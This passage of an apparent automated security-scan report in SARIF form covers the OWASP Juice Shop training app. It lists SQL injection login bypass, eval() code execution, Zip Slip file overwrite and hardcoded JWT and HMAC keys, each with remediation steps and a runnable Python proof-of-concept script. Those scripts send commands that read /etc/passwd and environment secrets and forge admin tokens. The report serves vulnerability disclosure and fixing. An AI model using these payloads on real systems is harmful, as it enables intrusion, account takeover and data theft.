+              "impact": "Successful exploitation allows an attacker to:\n\n- Bypass authentication entirely and log in as any user, including the administrator account\n- Extract sensitive data from the Users table (emails, password hashes, roles, TOTP secrets)\n- Enumerate all user accounts and their associated metadata\n- Escalate privileges by authenticating as admin or accounting-role users\n- Potentially pivot to further system compromise through administrative functionality\n\nBusiness impact is severe: full account takeover across all user tiers, exposure of personally identifiable information, and loss of trust in the platform's authentication controls.",
+              "technical_analysis": "The vulnerability resides in `routes/login.ts` at line 34. The login handler uses Sequelize's `sequelize.query()` with a raw SQL string constructed via JavaScript template literals:\n\n```typescript\nmodels.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })\n```\n\nThe `req.body.email` value is inserted directly into the query without any escaping, parameterization, or input validation. The underlying database is SQLite, which supports standard SQL injection techniques.\n\nRoot cause: The developer used string interpolation instead of Sequelize's built-in parameterized query mechanism (bind parameters or replacements). While Sequelize provides safe APIs for parameterized queries, the raw `sequelize.query()` call with interpolated values bypasses all ORM-level protections.\n\nThe attack vector is straightforward: by injecting SQL syntax into the email field, an attacker can alter the WHERE clause logic. For example, submitting `' OR 1=1--` as the email value transforms the query into one that always returns the first user in the table (typically the admin). More targeted attacks can select specific users by injecting conditions on the `id` or `email` columns.",
+              "remediation_steps": "1. Replace the raw SQL query with Sequelize's parameterized query using bind parameters:\n\n```typescript\nmodels.sequelize.query(\n  `SELECT * FROM Users WHERE email = :email AND password = :password AND deletedAt IS NULL`,\n  {\n    replacements: { email: req.body.email || '', password: security.hash(req.body.password || '') },\n    model: UserModel,\n    plain: true\n  }\n)\n```\n\n2. Alternatively, use Sequelize's ORM `findOne` method which automatically parameterizes inputs:\n\n```typescript\nUserModel.findOne({\n  where: {\n    email: req.body.email || '',\n    password: security.hash(req.body.password || ''),\n    deletedAt: null\n  }\n})\n```\n\n3. Add input validation to reject email values containing SQL metacharacters or exceeding expected length.\n\n4. Implement application-level rate limiting on the login endpoint to slow down automated injection attempts.\n\n5. Enable query logging in non-production environments to detect unexpected query patterns during testing.",
+              "poc": {
+                "description": "To reproduce the authentication bypass:\n\n1. Send a POST request to the `/rest/user/login` endpoint with a JSON body containing a crafted email field.\n2. Use the payload `' OR 1=1--` as the email value and any arbitrary string as the password.\n3. The injected SQL comment (`--`) neutralizes the remaining WHERE clause conditions (password check and deletedAt check).\n4. The query returns the first active user row (typically the admin account with id=1).\n5. The server responds with a valid JWT authentication token for the matched account.\n\nAlternative targeted payloads:\n- `' OR id=1--` — authenticate as the user with id 1 (admin)\n- `admin@juice-sh.op'--` — authenticate as admin by closing the email string and commenting out the password check\n- `' UNION SELECT * FROM Users WHERE role='admin'--` — target admin-role accounts specifically",
+                "script": "import requests\nimport json\n\nBASE_URL = \"http://localhost:3000\"\nLOGIN_ENDPOINT = f\"{BASE_URL}/rest/user/login\"\n\n# Payload 1: OR-based authentication bypass (returns first user = admin)\npayload_or_bypass = {\n    \"email\": \"' OR 1=1--\",\n    \"password\": \"anything\"\n}\n\n# Payload 2: Targeted admin login by commenting out password check\npayload_admin_targeted = {\n    \"email\": \"admin@juice-sh.op'--\",\n    \"password\": \"irrelevant\"\n}\n\n# Payload 3: Extract data via error-based or UNION injection\npayload_union = {\n    \"email\": \"' UNION SELECT id,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive,username,NULL,NULL,NULL FROM Users WHERE role='admin'--\",\n    \"password\": \"anything\"\n}\n\ndef test_sqli(description, payload):\n    print(f\"\\n{'='*60}\")\n    print(f\"Test: {description}\")\n    print(f\"Payload: {json.dumps(payload)}\")\n    print(f\"{'='*60}\")\n    \n    try:\n        resp = requests.post(LOGIN_ENDPOINT, json=payload, timeout=10)\n        print(f\"Status: {resp.status_code}\")\n        \n        if resp.status_code == 200:\n            data = resp.json()\n            auth = data.get(\"authentication\", {})\n            print(f\"[VULNERABLE] Authentication bypass successful!\")\n            print(f\"Token: {auth.get('token', 'N/A')[:50]}...\")\n            print(f\"User email: {auth.get('umail', 'N/A')}\")\n            print(f\"Basket ID: {auth.get('bid', 'N/A')}\")\n            return True\n        else:\n            print(f\"Response: {resp.text[:200]}\")\n            return False\n    except requests.RequestException as e:\n        print(f\"Connection error: {e}\")\n        return False\n\ndef main():\n    print(\"SQL Injection - Authentication Bypass PoC\")\n    print(\"Target: OWASP Juice Shop Login Endpoint\")\n    \n    results = []\n    results.append(test_sqli(\"OR-based bypass (first user = admin)\", payload_or_bypass))\n    results.append(test_sqli(\"Targeted admin login (comment out password)\", payload_admin_targeted))\n    results.append(test_sqli(\"UNION-based injection\", payload_union))\n    \n    print(f\"\\n\\nSummary: {sum(results)}/{len(results)} payloads succeeded\")\n    if any(results):\n        print(\"[CRITICAL] SQL Injection confirmed - authentication bypass achieved\")\n    \n    return 0 if any(results) else 1\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())"
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-94",
+          "level": "error",
+          "message": {
+            "text": "Server-Side Code Injection via eval() in User Profile Username Processing"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/userProfile.ts"
+                },
+                "region": {
+                  "startLine": 55,
+                  "endLine": 65,
+                  "snippet": {
+                    "text": "if (username?.match(/#{(.*)}/) !== null && utils.isChallengeEnabled(challenges.usernameXssChallenge)) {\n      req.app.locals.abused_ssti_bug = true\n      const code = username?.substring(2, username.length - 1)\n      try {\n        if (!code) {\n          throw new Error('Username is null')\n        }\n        username = eval(code) // eslint-disable-line no-eval\n      } catch (err) {\n        username = '\\\\' + username\n      }\n    }"
+                  }
+                }
+              },
+              "message": {
+                "text": "User-controlled username content passed to eval() - server-side code injection"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/userProfile.ts"
+                },
+                "region": {
+                  "startLine": 73,
+                  "endLine": 75,
+                  "snippet": {
+                    "text": "if (username) {\n      template = template.replace(/_username_/g, username)\n    }"
+                  }
+                }
+              },
+              "message": {
+                "text": "Username inserted into Pug template via string replacement before compilation (SSTI sink)"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "9.9",
+            "strix": {
+              "id": "vuln-0010",
+              "severity": "critical",
+              "cvss": 9.9,
+              "timestamp": "2026-05-09 09:47:40 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/profile",
+              "method": "GET",
+              "cwe": "CWE-94",
+              "impact": "Successful exploitation enables an attacker to:\n\n- Execute arbitrary JavaScript code on the server with the privileges of the Node.js process\n- Read sensitive files from the server filesystem (e.g., environment variables, encryption keys, database files)\n- Establish reverse shells or persistent backdoors on the application server\n- Access and exfiltrate all data from the application database\n- Pivot to internal network resources accessible from the server\n- Modify application behavior or inject malicious content for all users\n- Achieve complete server compromise\n\nThe attack requires only that an authenticated user can modify their username field (via the profile update endpoint) and subsequently visit the profile page. This is a critical severity issue as it provides full remote code execution with no additional privileges beyond a standard user account.",
+              "technical_analysis": "The vulnerability exists in `routes/userProfile.ts` and involves two distinct but related injection paths:\n\n**Path 1: eval()-based Code Injection (lines 55-62)**\n\nWhen the `usernameXssChallenge` is enabled (default), the application checks if the username matches the regex `#{(.*)}`. If it does, it extracts the content and executes it via `eval()`:\n\n```typescript\nif (username?.match(/#{(.*)}/) !== null && utils.isChallengeEnabled(challenges.usernameXssChallenge)) {\n  req.app.locals.abused_ssti_bug = true\n  const code = username?.substring(2, username.length - 1)\n  try {\n    if (!code) { throw new Error('Username is null') }\n    username = eval(code) // Server-side code execution\n  } catch (err) {\n    username = '\\\\' + username\n  }\n}\n```\n\nThe `eval()` executes in the Node.js server context with full access to `require()`, `process`, `fs`, and all server-side modules. An attacker setting their username to `#{require('child_process').execSync('id').toString()}` would execute the `id` command on the server.\n\n**Path 2: Pug Template Injection (line 74)**\n\nAfter the eval processing, the username value is inserted into the raw Pug template string via string replacement:\n\n```typescript\ntemplate = template.replace(/_username_/g, username)\n```\n\nThis occurs before `pug.compile(template)` is called at line 87. If the username (or eval result) contains Pug template syntax, it will be compiled and executed as part of the template. This creates a server-side template injection even if the eval path is somehow bypassed.\n\n**Attack Chain:**\n1. Attacker registers/updates account with username: `#{global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}`\n2. Attacker visits GET /profile\n3. Server evaluates the code via eval()\n4. Command output becomes the rendered username\n5. Full RCE achieved",
+              "remediation_steps": "1. Remove the `eval()` call entirely. There is no secure way to evaluate user-controlled strings as code:\n\n   ```typescript\n   // Remove the entire eval block (lines 55-68)\n   // Always escape the username for safe template insertion\n   username = '\\\\' + username\n   ```\n\n2. If dynamic username rendering is required, use a strict allowlist of safe characters and HTML-encode the output:\n\n   ```typescript\n   const entities = new Entities()\n   username = entities.encode(user.username || '')\n   ```\n\n3. Replace the raw string substitution into the Pug template with proper Pug variable passing to leverage Pug's built-in escaping:\n\n   ```typescript\n   const fn = pug.compile(template)\n   res.send(fn({ username: entities.encode(username), ...otherVars }))\n   ```\n\n4. Apply Content-Security-Policy headers that restrict script execution sources and prevent inline JavaScript.\n\n5. Implement input validation on the username field at the model level to reject special characters and template syntax patterns.",
+              "poc": {
+                "description": "To reproduce:\n\n1. Authenticate to the application as any registered user.\n\n2. Update the user's username to a payload containing the eval trigger pattern. Use the profile update endpoint:\n   ```\n   POST /profile\n   Content-Type: application/x-www-form-urlencoded\n   \n   username=#{global.process.mainModule.require('child_process').execSync('id').toString()}\n   ```\n\n3. Navigate to the profile page:\n   ```\n   GET /profile\n   ```\n\n4. The server processes the username, matches the `#{...}` pattern, extracts the code, and passes it to `eval()`.\n\n5. The `id` command executes on the server, and its output (e.g., `uid=1000(juicer) gid=1000(juicer)`) is rendered as the username on the profile page.\n\n6. For data exfiltration, use payloads such as:\n   - `#{require('fs').readFileSync('/etc/passwd','utf8')}`\n   - `#{JSON.stringify(process.env)}`\n   - `#{require('fs').readFileSync('encryptionkeys/jwt.pub','utf8')}`",
+                "script": "import requests\n\nBASE_URL = \"http://localhost:3000\"\n\n# Step 1: Login to get auth token\nlogin_payload = {\n    \"email\": \"admin@juice-sh.op\",\n    \"password\": \"admin123\"\n}\n\nprint(\"[*] Step 1: Authenticating...\")\ntry:\n    login_resp = requests.post(f\"{BASE_URL}/rest/user/login\", json=login_payload, timeout=10)\n    if login_resp.status_code == 200:\n        token = login_resp.json()[\"authentication\"][\"token\"]\n        print(f\"[+] Authenticated. Token: {token[:20]}...\")\n    else:\n        print(f\"[-] Login failed: {login_resp.status_code}\")\n        print(\"[!] Demonstrating vulnerability via source analysis only\")\n        token = None\nexcept requests.exceptions.ConnectionError:\n    print(\"[!] Could not connect. Demonstrating via source analysis.\")\n    token = None\n\n# Step 2: Update username with eval payload\nif token:\n    headers = {\"Authorization\": f\"Bearer {token}\", \"Cookie\": f\"token={token}\"}\n    \n    # RCE payload - executes 'id' command on server\n    rce_username = \"#{global.process.mainModule.require('child_process').execSync('id').toString()}\"\n    \n    print(f\"\\n[*] Step 2: Setting username to eval payload...\")\n    print(f\"[*] Payload: {rce_username}\")\n    \n    update_resp = requests.post(\n        f\"{BASE_URL}/profile\",\n        headers=headers,\n        data={\"username\": rce_username},\n        timeout=10,\n        allow_redirects=False\n    )\n    print(f\"[*] Update response: {update_resp.status_code}\")\n\n    # Step 3: Visit profile to trigger eval\n    print(f\"\\n[*] Step 3: Visiting /profile to trigger eval()...\")\n    profile_resp = requests.get(\n        f\"{BASE_URL}/profile\",\n        headers=headers,\n        cookies={\"token\": token},\n        timeout=10\n    )\n    print(f\"[*] Profile response status: {profile_resp.status_code}\")\n    \n    # Check if command output appears in response\n    if \"uid=\" in profile_resp.text:\n        print(\"[+] VULNERABLE: Server-side code execution confirmed!\")\n        # Extract the uid line\n        for line in profile_resp.text.split('\\n'):\n            if 'uid=' in line:\n                print(f\"[+] Command output: {line.strip()[:100]}\")\n                break\n    else:\n        print(\"[*] Response received - check for eval execution evidence\")\n        print(f\"[*] Response snippet: {profile_resp.text[:500]}\")\nelse:\n    print(\"\\n[!] Source code analysis confirms vulnerability:\")\n    print(\"[!] File: routes/userProfile.ts, Lines 55-62\")\n    print(\"[!] eval(code) is called with user-controlled username content\")\n    print(\"[!] No input validation or sandboxing applied before eval()\")"
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-22",
+          "level": "error",
+          "message": {
+            "text": "Arbitrary File Write via Zip Slip in File Upload Endpoint"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/fileUpload.ts"
+                },
+                "region": {
+                  "startLine": 41,
+                  "endLine": 48,
+                  "snippet": {
+                    "text": "const fileName = entry.path\n                const absolutePath = path.resolve('uploads/complaints/' + fileName)\n                challengeUtils.solveIf(challenges.fileWriteChallenge, () => { return absolutePath === path.resolve('ftp/legal.md') })\n                if (absolutePath.includes(path.resolve('.'))) {\n                  entry.pipe(fs.createWriteStream('uploads/complaints/' + fileName).on('error', function (err) { next(err) }))\n                } else {\n                  entry.autodrain()\n                }"
+                  }
+                }
+              },
+              "message": {
+                "text": "Insufficient path validation allowing directory traversal in ZIP entries (sink)"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "9.1",
+            "strix": {
+              "id": "vuln-0012",
+              "severity": "critical",
+              "cvss": 9.1,
+              "timestamp": "2026-05-09 09:47:57 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/file-upload",
+              "method": "POST",
+              "cwe": "CWE-22",
+              "impact": "Successful exploitation allows an attacker to:\n\n- Write arbitrary files to any location within the application's root directory tree, including overwriting existing application files.\n- Achieve remote code execution by overwriting server-side templates, configuration files, or JavaScript modules that are subsequently loaded by the application.\n- Deface the application by overwriting static assets or frontend files.\n- Modify legal documents, terms of service, or privacy policy files served from the /ftp directory.\n- Potentially escalate to full server compromise if writable paths include startup scripts or cron-accessible locations.\n\nBusiness impact includes service integrity compromise, unauthorized content modification, and potential for persistent backdoor installation.",
+              "technical_analysis": "The vulnerability resides in the `handleZipFileUpload` function within `routes/fileUpload.ts`. When a ZIP file is uploaded, each entry is extracted using the `unzipper` library. The critical logic is on lines 41-45:\n\n```javascript\nconst fileName = entry.path                                          // line 41\nconst absolutePath = path.resolve('uploads/complaints/' + fileName)  // line 42\n// ...\nif (absolutePath.includes(path.resolve('.'))) {                      // line 44\n  entry.pipe(fs.createWriteStream('uploads/complaints/' + fileName)) // line 45\n}\n```\n\nThe validation on line 44 checks whether the resolved absolute path includes the application's current working directory (obtained via `path.resolve('.')`). This check is fundamentally flawed because:\n\n1. `path.resolve('.')` returns the application root (e.g., `/app` or `/workspace/juice-shop-src`)\n2. A ZIP entry with path `../../ftp/legal.md` resolves via `path.resolve('uploads/complaints/../../ftp/legal.md')` to `/app/ftp/legal.md`\n3. The string `/app/ftp/legal.md` does include `/app` (the resolved `.`), so the check passes\n4. The file is then written to `uploads/complaints/../../ftp/legal.md`, which the filesystem resolves to `ftp/legal.md`\n\nThe correct validation should verify that the resolved path **starts with** the intended destination directory (`uploads/complaints/`), not merely that it contains the application root. Any traversal that stays within the application root but escapes the intended subdirectory will bypass this check.\n\nThe endpoint requires no authentication and accepts files up to 200KB via multer memory storage.",
+              "remediation_steps": "1. Replace the flawed path inclusion check with a proper prefix validation that ensures the resolved path starts with the intended destination directory:\n\n```javascript\nconst destDir = path.resolve('uploads/complaints/')\nconst absolutePath = path.resolve('uploads/complaints/' + fileName)\nif (!absolutePath.startsWith(destDir + path.sep)) {\n  entry.autodrain()\n  return\n}\n```\n\n2. Reject ZIP entries that contain path traversal sequences (`../`) or absolute paths before resolution:\n\n```javascript\nif (fileName.includes('..') || path.isAbsolute(fileName)) {\n  entry.autodrain()\n  return\n}\n```\n\n3. Sanitize the filename by extracting only the base name if subdirectories within the upload folder are not required:\n\n```javascript\nconst safeName = path.basename(fileName)\n```\n\n4. Consider requiring authentication for file upload operations to reduce the attack surface.\n\n5. Apply filesystem permissions to limit the application's write access to only necessary directories.",
+              "poc": {
+                "description": "To reproduce:\n\n1. Create a malicious ZIP archive containing an entry with a traversal path. The entry name should be `../../ftp/legal.md` (or any other target path relative to `uploads/complaints/`).\n\n2. Use Python's zipfile module to craft the archive:\n```python\nimport zipfile, io\nbuf = io.BytesIO()\nwith zipfile.ZipFile(buf, 'w') as zf:\n    zf.writestr('../../ftp/legal.md', '# Overwritten by attacker')\nbuf.seek(0)\n```\n\n3. Upload the malicious ZIP file to POST /file-upload with the field name \"file\".\n\n4. Verify that the file at `ftp/legal.md` has been overwritten with the attacker-controlled content.\n\n5. To confirm arbitrary write capability, target other application files such as `views/userProfile.pug` or frontend assets.",
+                "script": "import requests\nimport zipfile\nimport io\nimport os\n\nBASE_URL = \"http://localhost:3000\"\nUPLOAD_ENDPOINT = f\"{BASE_URL}/file-upload\"\n\n# Target file to overwrite (relative to uploads/complaints/)\nTARGET_PATH = \"../../ftp/legal.md\"\nMALICIOUS_CONTENT = \"# OVERWRITTEN BY SECURITY TEST\\n\\nThis file was overwritten via Zip Slip vulnerability.\\n\"\n\n# Create malicious ZIP with directory traversal in entry name\nzip_buffer = io.BytesIO()\nwith zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:\n    zf.writestr(TARGET_PATH, MALICIOUS_CONTENT)\nzip_buffer.seek(0)\n\n# Upload the malicious ZIP\nfiles = {\n    \"file\": (\"payload.zip\", zip_buffer, \"application/zip\")\n}\n\nprint(\"[*] Uploading malicious ZIP with traversal path entry...\")\nprint(f\"[*] Target entry path: {TARGET_PATH}\")\nresponse = requests.post(UPLOAD_ENDPOINT, files=files, timeout=10)\nprint(f\"[*] Upload response status: {response.status_code}\")\n\n# Verify the file was overwritten by fetching it\nprint(\"\\n[*] Attempting to fetch overwritten file...\")\nverify_url = f\"{BASE_URL}/ftp/legal.md\"\nverify_response = requests.get(verify_url, timeout=10)\nprint(f\"[*] Fetch status: {verify_response.status_code}\")\nprint(f\"[*] Content: {verify_response.text[:200]}\")\n\nif \"OVERWRITTEN BY SECURITY TEST\" in verify_response.text:\n    print(\"\\n[+] ZIP SLIP CONFIRMED: File successfully overwritten outside uploads/complaints/!\")\nelse:\n    print(\"\\n[-] File content not modified; traversal may have been blocked or file not served.\")"
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-798",
+          "level": "error",
+          "message": {
+            "text": "Hardcoded Cryptographic Keys Enable JWT Forgery and Security Answer Disclosure"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "lib/insecurity.ts"
+                },
+                "region": {
+                  "startLine": 23,
+                  "endLine": 23,
+                  "snippet": {
+                    "text": "const privateKey = '-----BEGIN RSA PRIVATE KEY-----\\r\\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\\r\\n-----END RSA PRIVATE KEY-----'"
+                  }
+                }
+              },
+              "message": {
+                "text": "Hardcoded RSA private key for JWT signing"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "lib/insecurity.ts"
+                },
+                "region": {
+                  "startLine": 44,
+                  "endLine": 44,
+                  "snippet": {
+                    "text": "export const hmac = (data: string) => crypto.createHmac('sha256', 'pa4qacea4VK9t9nGv7yZtwmj').update(data).digest('hex')"
+                  }
+                }
+              },
+              "message": {
+                "text": "Hardcoded HMAC secret for security answer hashing"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "encryptionkeys/jwt.pub"
+                },
+                "region": {
+                  "startLine": 1,
+                  "endLine": 3,
+                  "snippet": {
+                    "text": "-----BEGIN RSA PUBLIC KEY-----\nMIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=\n-----END RSA PUBLIC KEY-----"
+                  }
+                }
+              },
+              "message": {
+                "text": "Public key shipped in repository (paired with hardcoded private key)"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "9.1",
+            "strix": {
+              "id": "vuln-0013",
+              "severity": "critical",
+              "cvss": 9.1,
+              "timestamp": "2026-05-09 09:49:20 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/rest/user/login",
+              "method": "POST",
+              "cwe": "CWE-798",
+              "impact": "An attacker who obtains the hardcoded private key (from the public repository) can:\n\n- Forge JWT tokens for any user, including administrators, achieving complete authentication bypass and privilege escalation without credentials\n- Maintain persistent access by minting long-lived tokens that bypass all authentication controls\n- Impersonate any user for data access, order manipulation, or administrative actions\n\nWith the hardcoded HMAC secret, an attacker can:\n- Compute valid HMAC hashes for arbitrary security answer guesses, effectively brute-forcing security answers offline\n- Bypass the password reset mechanism for any account by testing candidate answers locally\n\nTogether, these constitute a complete authentication system compromise.",
+              "technical_analysis": "Two hardcoded secrets are present in `lib/insecurity.ts`:\n\n1. **RSA Private Key** (line 23): The full RSA private key is embedded as a string constant:\n```typescript\nconst privateKey = '-----BEGIN RSA PRIVATE KEY-----\\r\\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\\r\\n-----END RSA PRIVATE KEY-----'\n```\n\nThis key is used on line 56 to sign JWTs:\n```typescript\nexport const authorize = (user = {}) => jwt.sign(user, privateKey, { expiresIn: '6h', algorithm: 'RS256' })\n```\n\n2. **HMAC Secret** (line 44): The secret for hashing security answers:\n```typescript\nexport const hmac = (data: string) => crypto.createHmac('sha256', 'pa4qacea4VK9t9nGv7yZtwmj').update(data).digest('hex')\n```\n\nRoot cause: Secrets are committed to version control and embedded in application code rather than loaded from a secure external source (environment variables, secrets manager, or hardware security module).",
+              "remediation_steps": "1. Remove all hardcoded cryptographic keys from source code immediately. Generate new RSA key pairs and HMAC secrets that are never committed to version control.\n\n2. Load the JWT private key from an environment variable or a secrets management service (e.g., AWS Secrets Manager, HashiCorp Vault, Azure Key Vault) at application startup.\n\n3. Rotate the compromised keys: since the current private key is publicly known, all existing JWTs must be considered compromised. Force re-authentication for all users after deploying new keys.\n\n4. Replace the hardcoded HMAC secret with a per-deployment secret loaded from environment configuration. Consider adding a per-user component (e.g., user ID) to the HMAC input to prevent cross-user attacks even with secret knowledge.\n\n5. Add pre-commit hooks and CI/CD checks (e.g., gitleaks, trufflehog) to prevent future key material from being committed to the repository.\n\n6. Add the `encryptionkeys/` directory to `.gitignore` and document the key provisioning process for deployment.",
+              "poc": {
+                "description": "To reproduce JWT forgery:\n\n1. Extract the private key from the source code at `lib/insecurity.ts` line 23.\n2. Use the key to sign a forged JWT token with arbitrary claims (e.g., admin role, any user ID).\n3. Send the forged token in an Authorization header to any protected endpoint.\n4. Observe that the server accepts the forged token as valid and grants access.\n\nTo reproduce HMAC bypass:\n1. Extract the HMAC secret `'pa4qacea4VK9t9nGv7yZtwmj'` from line 44.\n2. Compute HMAC-SHA256 of candidate security answers using this secret.\n3. Compare against stored answer hashes to identify the correct answer offline.\n4. Use the discovered answer to reset any user's password.",
+                "script": "import jwt\nimport hmac\nimport hashlib\nimport json\nimport time\n\n# === JWT Forgery PoC ===\n# Private key extracted from lib/insecurity.ts line 23\nPRIVATE_KEY = \"\"\"-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\n-----END RSA PRIVATE KEY-----\"\"\"\n\n# Forge an admin token\nforged_payload = {\n    \"status\": \"success\",\n    \"data\": {\n        \"id\": 1,\n        \"username\": \"admin\",\n        \"email\": \"admin@juice-sh.op\",\n        \"password\": \"0192023a7bbd73250516f069df18b500\",\n        \"role\": \"admin\",\n        \"deluxeToken\": \"\",\n        \"lastLoginIp\": \"0.0.0.0\",\n        \"profileImage\": \"/assets/public/images/uploads/defaultAdmin.png\",\n        \"totpSecret\": \"\",\n        \"isActive\": True\n    },\n    \"iat\": int(time.time()),\n    \"exp\": int(time.time()) + 21600  # 6 hours\n}\n\nforged_token = jwt.encode(forged_payload, PRIVATE_KEY, algorithm=\"RS256\")\nprint(\"=== JWT Forgery PoC ===\")\nprint(f\"Forged admin token: {forged_token[:80]}...\")\nprint(f\"Token length: {len(forged_token)} chars\")\nprint(\"This token will be accepted by the server as a valid admin session.\")\nprint()\n\n# === HMAC Secret Exploitation PoC ===\nHMAC_SECRET = \"pa4qacea4VK9t9nGv7yZtwmj\"\n\ndef compute_security_answer_hash(answer: str) -> str:\n    \"\"\"Replicates the hmac function from lib/insecurity.ts\"\"\"\n    return hmac.new(\n        HMAC_SECRET.encode(),\n        answer.encode(),\n        hashlib.sha256\n    ).hexdigest()\n\n# Brute-force common security answers offline\ncandidate_answers = [\"Samuel\", \"Stop'n'Drop\", \"West-2082\", \"5N0wb41L\", \"Zaya\", \"John\"]\nprint(\"=== HMAC Secret Exploitation PoC ===\")\nprint(f\"HMAC Secret: {HMAC_SECRET}\")\nprint(\"Computing offline hashes for candidate security answers:\")\nfor answer in candidate_answers:\n    h = compute_security_answer_hash(answer)\n    print(f\"  Answer '{answer}' -> {h}\")\n\nprint()\nprint(\"CONFIRMED: Hardcoded keys allow JWT forgery and offline security answer cracking\")"
